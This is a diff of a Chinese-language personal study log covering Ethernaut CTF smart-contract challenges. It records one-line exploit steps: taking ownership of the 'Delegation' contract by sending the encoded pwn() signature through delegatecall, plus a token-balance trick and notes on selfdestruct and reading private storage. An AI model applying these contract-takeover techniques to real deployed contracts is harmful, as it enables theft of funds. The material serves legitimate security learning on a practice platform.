@@ -178,4 +178,31 @@ Rubixi hack
 >>   `contract.transfer(contract.address, 21)`
 >> 4.`await contract.balanceOf(player)`會發現持有超多token
 >> 通關~
+>> 
+>#### Ethernaut CTF (7/31)
+>>##### Delegation
+>>##### 目標： 成為owner
+>>##### 先備知識
+>> - [delegatecall](https://eip2535diamonds.substack.com/p/understanding-delegatecall-and-how)
+>> - [encodeFunctionSignature](https://www.rareskills.io/post/abi-encoding)
+>> ###### 解題
+>> 1.取得signature `signature = web3.eth.abi.encodeFunctionSignature("pwn()")`
+>>2.利用sendTransaction 觸發callback `contract.sendTransaction({ from: player, data: signature })`
+>>3.成為owner
+
+### 2024.09.04
+>#### Ethernaut CTF (7/31)
+>>##### Delegation
+>>##### 目標：強迫收款
+>>##### 先備知識
+>> - [selfdestruct](https://solidity-by-example.org/hacks/self-destruct/) deprecate
+>> 一個把當前合約毀滅並把剩餘ether轉換到指定地址
+>> ###### 解題 (失敗)
+
+>#### Ethernaut CTF (8/31)
+>>##### Vault
+>>##### 目標：Unlock the vault
+>>##### 先備知識
+>> - 如何獲取變數位置
+### 2024.09.05
 <!-- Content_END -->
